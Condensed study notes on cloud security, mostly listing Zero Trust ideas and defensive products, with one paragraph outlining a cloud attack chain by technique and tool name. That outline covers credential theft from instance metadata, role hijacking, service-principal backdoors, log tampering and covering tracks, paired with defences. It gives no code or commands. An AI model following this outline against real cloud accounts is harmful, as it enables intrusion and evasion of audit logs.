Zero Trust — no user/device automatically trusted; micro-segmentation + MFA + PAM + continuous validation. Compliance checklists for security team / organization / provider (operations, technology, management). Orgs: **Cloud Security Alliance (CSA)**. Shadow asset discovery: Securiti, CloudEagle, Microsoft Defender for Cloud Apps. Cloud security tools: Qualys Cloud Platform, Prisma Cloud, Netskope. Container tools: Aqua, Sysdig Falco, Anchore, Snyk Container. Kubernetes tools: ACS (Red Hat), Aqua K8s Security, Kyverno, Kubescape. Serverless tools: Dashbird, CloudGuard, Prisma Cloud. **CASB** — gatekeeper between on-prem + cloud (visibility, data security, threat protection, compliance); solutions: Forcepoint ONE, Cisco Cloudlock, Zscaler, FortiCASB. **NG SWG** — cloud-based gateway (URL filtering, TLS decryption, CASB, ATP/sandboxing, DLP); Netskope, Cloudflare Gateway, Skyhigh.

> Flow: profile the target cloud (Shodan filters, Masscan) → assess vulns (Prowler/CloudSploit/Scout Suite) → exploit per provider — AWS (S3/IAM enumeration, IMDS key theft, Pacu role hijack, Lambda abuse, privesc, CloudTrail tampering), Azure (AADInternals/MicroBurst recon, password spray, managed-identity abuse, service-principal backdoors), GCP (gcloud enumeration, bucket ACL privesc), containers (kubectl/Docker remote API, LXD privesc, etcd) → persist + cover tracks. Defend with shared-responsibility clarity, least-privilege IAM + MFA, encryption + key management (HSM), network segmentation (VPC/NSG + zero trust), CASB/NG-SWG, CSPM, and container/K8s/serverless hardening (no root, image scanning, OPA, secrets encryption).
